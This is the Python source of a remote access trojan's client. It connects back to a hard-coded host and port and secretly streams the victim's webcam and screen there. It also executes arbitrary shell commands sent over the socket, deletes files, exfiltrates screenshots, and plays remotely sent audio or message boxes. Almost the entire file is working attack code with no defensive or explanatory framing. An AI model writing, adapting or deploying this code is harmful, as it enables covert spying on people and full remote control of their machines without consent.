import sys
import socket
import vidstream
import ipaddress
import time
import pyautogui
import os
import uuid
import threading
import pymsgbox
import playsound
import struct
import subprocess

class RATjobs:
    @staticmethod
    def get_path_executable() -> str:
        return sys.executable if getattr(sys, 'frozen', False) else __file__
    
    @staticmethod
    def play_sound(file: str) -> None:
        try:
            playsound.playsound(file, True)
        except playsound.PlaysoundException as e:
            print(e+"\n"+e.add_note())

        try: os.remove(file)
        except Exception as e: pass


    
class RATlistener():
    def __init__(self, ip: str | None = None, port: int | None = None):
        if ip is None or port is None:
            raise Exception("An empty arguement error.")

        if port > 65535 or port < 1:
            raise ConnectionRefusedError("Port range is beyond of the borders.")
        
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            raise ConnectionRefusedError("InValid IP Address.")
        
        self.ip = ip
        self.port = port


    _stream_connected: bool = False
    _socket_connected: bool = False


    def _try_to_connect(self) -> socket.socket:
        addr = (self.ip, self.port)
        while True:
            client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            client_sock.settimeout(None)
            try:
                print("continue")
                client_sock.connect(addr)
                return client_sock
            except Exception:
                time.sleep(5)
                client_sock.close() # soketi serbest bırak


    def _try_to_connect_stream_camera(self) -> None:
        while True:
            print("start")
            camera_share = vidstream.CameraClient(self.ip, self.port + 20)

            camera_share.start_stream()

            while camera_share._running == True and self._socket_connected:
                time.sleep(2)
                print("while", camera_share._running)
                
            
            print("pass")
            camera_share.stop_stream()
            time.sleep(2)

    def _try_to_connect_stream_screenshare(self) -> None:
        while True:
            print("start")
            screen_share = vidstream.ScreenShareClient(self.ip, self.port + 30)

            screen_share.start_stream()

            while screen_share._running == True and self._socket_connected:
                time.sleep(2)
                print("while 2", screen_share._running)

            print("pass")
            screen_share.stop_stream()
            time.sleep(2)

    
    def start_commands(self) -> None:
        print("listen: 1")
        client_socket = self._try_to_connect()
        self._socket_connected = True
        print("listen 2")

        while True:
            try:
                server_command = client_socket.recv(8192).decode('utf-8')

                if server_command.lower() in ['exit', 'quit', 'leave']:
                    print("DAMN FUCKING LEAVE!")
                    client_socket.close()
                    self._socket_connected = False
                    client_socket = self._try_to_connect()
                    self._socket_connected = True
                    continue

                elif server_command.strip().startswith("messagebox"):
                    data = server_command.splitlines()

                    msgbox_count = int(data[1])
                    msgbox_text = data[2]
                    msgbox_title = data[3]
                    msgbox_icon = int(data[4])

                    if msgbox_count > 1:
                        for i in range(msgbox_count):
                            thread = threading.Thread(
                                target=lambda: pymsgbox.alert(msgbox_text, msgbox_title, icon=msgbox_icon), daemon=True
                            )
                            thread.start()
                    else:
                        thread = threading.Thread(target=lambda: pymsgbox.alert(msgbox_text, msgbox_title, icon=msgbox_icon))
                        thread.daemon = True
                        thread.start()

                    continue

                elif server_command.strip().startswith("command_prompt"):
                    data = server_command.splitlines()[1]
                    command_data = []

                    cmd = ""
                    for command in data:
                        if command != "_":
                            cmd += command
                        else:
                            command_data.append(cmd)
                            cmd = ""

                    if command_data[0] == "cd" and len(command_data) == 2:
                        if os.path.exists(command_data[1]):
                            os.chdir(command_data[1])
                            result_response = "[+] success"
                        else:
                            result_response = "[-] fail"


                    elif command_data[0] == "removefile" and len(command_data) == 2:
                        if os.path.exists(command_data[1]):
                            try:
                                os.remove(command_data[1])
                                result_response = "[+] success"
                            except Exception:
                                result_response = "[-] fail"
                        else:
                            result_response = "[-] fail"


                    else:
                        result = subprocess.run(command_data, capture_output=True, text=True, 
                            shell=True, encoding="utf-8", errors="replace"
                        )

                        match result.returncode:
                            case 0:
                                result_response = result.stdout if result.stdout else "[+] success"
                            case _:
                                result_response = result.stderr if result.stderr else "CMD FUNCTIONAL ERROR"
                        
                    client_socket.sendall(result_response.encode('utf-8'))

                match server_command.strip():
                    case "screenshot":
                        win11_temph = os.environ.get('TEMP')
                        saved_file = os.path.join(win11_temph, str(uuid.uuid4()) + ".jpg")
                        pyautogui.screenshot(saved_file)

                        file_size = os.path.getsize(saved_file)
                        client_socket.sendall(struct.pack('!Q', file_size))
                        
                        with open(saved_file, 'rb') as file:
                            while True:
                                data = file.read(8192)
                                if not data:
                                    break
                                client_socket.sendall(data)

                        try:  os.remove(saved_file)
                        except: pass

                    case "playsound":
                        size_data = b""
                        while len(size_data) < 8:
                            size_data = size_data + client_socket.recv(8 - len(size_data))

                        file_size = struct.unpack('!Q', size_data)[0]
                        
                        win11_temph = os.getenv('TEMP')
                        full_path = os.path.join(win11_temph, str(uuid.uuid4()))

                        received = 0
                        file_writed = False
                        with open(full_path + ".mp3", 'wb') as file:
                            while True:
                                data = client_socket.recv(min(8192, file_size - received))

                                if not received < file_size:
                                    file_writed = True
                                    break

                                file.write(data)
                                received = received + len(data)

                        if file_writed:
                            threading.Thread(target=RATjobs.play_sound, args=(full_path + ".mp3",), daemon=True).start()
                            client_socket.sendall(b"COMPLETE -> PLAYING")
                        else:
                            client_socket.sendall(b"FAIL")
                            

            except Exception as e:
                print("err -> {}".format(e))
                client_socket.close()
                client_socket = self._try_to_connect()


def Rat_Continue():    
    listener = RATlistener("192.168.1.153", 6536)

    cpu_core_1 = threading.Thread(target=listener._try_to_connect_stream_camera, daemon=True)
    cpu_core_1.start()

    cpu_core_2 = threading.Thread(target=listener._try_to_connect_stream_screenshare)
    cpu_core_2.daemon = True
    cpu_core_2.start()

    listener.start_commands()


if __name__ == '__main__':
    Rat_Continue()